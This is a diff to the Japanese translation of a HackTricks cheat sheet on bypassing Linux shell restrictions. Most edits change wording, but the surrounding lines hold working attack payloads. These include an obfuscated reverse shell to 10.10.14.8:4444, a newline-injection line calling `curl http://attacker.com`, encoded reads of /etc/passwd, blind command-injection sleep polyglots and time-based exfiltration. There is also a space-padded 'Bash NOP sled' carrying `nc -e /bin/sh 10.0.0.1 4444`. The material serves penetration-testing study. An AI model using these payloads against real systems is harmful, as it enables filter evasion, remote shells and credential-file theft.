@@ -1,8 +1,8 @@
-# Linuxの制限をバイパス
+# Linux制限のBypass
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## 一般的な制限のバイパス
+## 一般的な制限のBypass
 
 ### Reverse Shell
 ```bash
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass Paths と禁止ワード
+### パスと禁止ワードのバイパス
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### hex encodingを使ったBypass
+### hex encodingによるBypass
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -124,12 +124,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### IP のバイパス
+### IP制限のバイパス
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### 時間ベースのデータ持ち出し
+### 時間ベースのデータ exfiltration
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -144,8 +144,8 @@ echo ${PATH:0:1} #/
 
 ### Builtins
 
-外部関数を実行できず、**limited set of builtins** のみを使用して **RCE** を取得できる場合、それを実行するための便利な trick がいくつかあります。通常、すべての **builtins** を **使用できるわけではない** ため、jail を bypass するために試せる **すべての選択肢を把握しておく** 必要があります。アイデアの出典: [**devploit**](https://twitter.com/devploit)。\
-まず、すべての [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** を確認してください。** 次に、いくつかの **recommendations** を示します。
+外部関数を実行できず、**limited set of builtins to obtain RCE** にのみアクセスできる場合でも、それを実行するための便利なトリックがいくつかあります。通常、すべての **builtins** を使用できるわけではないため、jail を bypass するために試せる **すべての選択肢** を把握しておくべきです。アイデアの出典は [**devploit**](https://twitter.com/devploit) です。\
+まず、すべての [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** を確認してください。次に、いくつかの **recommendations** を示します:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Potential regexes の bypass
+### 潜在的なregexをバイパスする
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -212,7 +212,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5文字でRCE
+### 5文字でのRCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -296,8 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-**read-only および noexec protections** が適用された filesystem 内、あるいは distroless container 内にいる場合でも、**任意の binary、さらには shell さえも execute する方法があります!:**
-
+**read-only and noexec protections** が有効な filesystem 内や、distroless container 内にいる場合でも、**任意のバイナリ、さらには shell まで実行する方法があります！**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -305,38 +304,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Chroot & other Jails Bypass
 
-
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-脆弱性によって、最終的に `system()` や別の shell に到達する argument を部分的に control できる場合、payload の読み取りが開始される正確な offset がわからないことがあります。従来の NOP sled（例: `\x90`）は shell syntax では機能しませんが、Bash は command を execute する前に、先頭の whitespace を無害に無視します。
+脆弱性によって、最終的に `system()` やその他の shell に到達する引数を部分的に制御できる場合、payload の実行が開始される正確な offset がわからないことがあります。従来の NOP sled（例：`\x90`）は shell syntax では機能しませんが、Bash は command を実行する前に、先頭の whitespace を問題なく無視します。
 
-したがって、real command の前に大量の space または tab character を付けることで、*Bash 用の NOP sled* を作成できます:
+そのため、実際の command の前に大量のスペースまたは tab characters を付けることで、*Bash 用の NOP sled* を作成できます：<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-ROP chain（または任意のメモリ破壊プリミティブ）が space block 内のどこかに instruction pointer を着地させると、Bash parser は空白を単にスキップし、`nc` に到達して command を確実に実行します。
+ROP chain（または任意の memory-corruption primitive）が instruction pointer を space block 内のどこかに着地させると、Bash parser は空白を単純にスキップし、`nc` に到達して command を確実に実行します。
 
 実用的なユースケース：
 
-1. **メモリマップされた configuration blob**（例：NVRAM）で、プロセス間でアクセス可能なもの。
-2. 攻撃者が payload の位置合わせのために NULL byte を書き込めない状況。
-3. BusyBox の `ash`/`sh` しか利用できない組み込みデバイス。これらも先頭のスペースを無視します。
+1. **プロセス間でアクセス可能な memory-mapped configuration blob**（例：NVRAM）。
+2. attacker が payload のアライメント調整用に NULL バイトを書き込めない状況。
+3. BusyBox の `ash`/`sh` しか利用できない embedded device ― これらも先頭の空白を無視します。
 
-> 🛠️  このトリックを `system()` を呼び出す ROP gadget と組み合わせることで、メモリに制約のある IoT router で exploit の信頼性を大幅に向上させられます。
+> 🛠️  この trick を `system()` を呼び出す ROP gadget と組み合わせると、memory-constrained な IoT router で exploit の信頼性を大幅に向上できます。
 
-## References & More
+## 参考文献
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [放置された hardware の zero day を exploit する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
